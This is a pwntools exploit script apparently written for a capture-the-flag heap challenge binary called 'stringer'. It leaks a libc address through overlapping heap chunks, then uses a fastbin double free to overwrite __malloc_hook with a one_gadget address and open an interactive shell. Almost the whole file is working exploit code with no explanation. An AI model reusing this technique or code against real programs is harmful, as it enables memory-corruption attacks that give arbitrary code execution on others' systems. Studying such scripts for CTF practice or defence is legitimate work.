#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./stringer')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()



def c(idx):
    sla("choice: ",idx)

def malloc(size,content):
    c(1)
    sla("length: ",size)
    sla("content: ",content)

def free(idx):
    c(4)
    sla("index: ",idx)

def fill(idx,content):
    c(3)
    sla("index: ",idx)
    sla("index: ",content)


one = [0x45226,0x4527a,0xf03a4,0xf1247]

malloc(0x68,"AAAA")
malloc(0xf8,"BBBB")
malloc(0x68,"CCCC")
malloc(0x68,"DDDD")
malloc(0x68,"EEEE")

free(1)
fill(0,0x68)

malloc(0xf8,"FFFFFFF")

ru("F\n")
addr = u64(rc(8)[0:6].ljust(8,b"\x00"))
libc.address = addr - 0x3c4b78
malloc_hook =  libc.sym['__malloc_hook'] - 0x23
magic = libc.address + one[2]

lg("address",addr)
lg("libc",libc.address)
lg("malloc_hook",malloc_hook)

free(3)
free(4)
free(3)

# Fastbin attack
malloc(0x68, p64(malloc_hook).decode("iso-8859-1"))
malloc(0x68, p64(0xb00bface).decode("iso-8859-1"))
malloc(0x68, p64(0xb00bface).decode("iso-8859-1"))
malloc(0x68, (b'\x00'*0xb + p64(magic)*2).decode("iso-8859-1"))

#malloc(0x50,"DDDD")

io.sendline("4")
#io.sendline("5")

#io.sendline("4")
#io.sendline("5")
#free(5)
#free(5)
input()


io.interactive()
